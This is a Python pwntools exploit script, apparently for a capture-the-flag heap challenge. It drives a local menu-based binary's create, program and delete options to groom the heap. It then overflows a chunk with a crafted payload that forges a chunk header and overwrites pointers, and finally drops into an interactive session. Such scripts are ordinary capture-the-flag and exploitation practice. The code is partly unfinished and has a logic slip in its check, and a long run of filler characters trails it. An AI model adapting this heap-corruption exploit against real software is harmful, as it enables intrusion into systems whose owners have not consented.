#!/usr/bin/python3

from pwn import *

p = remote('127.0.0.1', 1337)	

file = ELF('main')

class Robot():
	def __init__(self, index, size, information):
		self.index = index
		self.size = size
		self.information = information

def create(size):
	p.recvuntil('> ')
	p.sendline('1')
	p.recvuntil('size:')
	p.sendline(f'{size}')
	p.recvuntil('index ')
	index = p.recv(1)
	return int(index)

def program(index, payload):
	p.recvuntil('> ')
	p.sendline('2')
	p.recv()
	p.sendline(f'{index}')
	p.recv()
	print(type(payload))
	p.sendline(payload)
	return

def delete(index):
	p.recvuntil('>')
	p.sendline('3')
	p.recv()
	p.sendline(f'{index}')
	return

def init_robot(size, information, check=True):
	robot = Robot('0', size, information)
	index = create(robot.size)
	robot.index = index
	if program:
		program(robot.index, robot.information)
	return robot

def exp():
	## DONT DELETE, this sets the pointers up correctly for an overwrite!!!!
	# robot1 = init_robot('300', 'A'*299)
	# robot2 = init_robot('9002', 'B'*9001)
	# delete(robot2.index)
	# delete(robot1.index)
	# robot3 = init_robot('257', '', False)
	
	robot1 = init_robot('300', 'A'*299)
	robot2 = init_robot('300', 'B'*299)
	robot3 = init_robot('300', 'C'*299)
	robot4 = init_robot('300', 'D'*299)
	robot5 = init_robot('9002', 'B'*9001)
	delete(robot5.index)
	delete(robot1.index)
	delete(robot2.index)
	delete(robot3.index)
	delete(robot4.index)
	robot6 = init_robot('300', 'A'*256)
	robot7 = init_robot('300', 'B'*256)
	robot8 = init_robot('300', 'C'*256)
	robot9 = init_robot('300', 'D'*256)
	program(robot5.index, b'A'*304+b"\x00\x00\x00\x00\x00\x00\x00\x00\x41\x01\x00\x00\x00\x00\x00\x00\x58\x40\x40\x00\x00\x00\x00\x00\x58\x40\x40\x00\x00\x00\x00\x00")
	# delete(robot6.index)
	# delete(robot7.index)
	# delete(robot8.index)
	# delete(robot9.index)

	p.interactive()


if __name__ == '__main__':
	exp()


AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA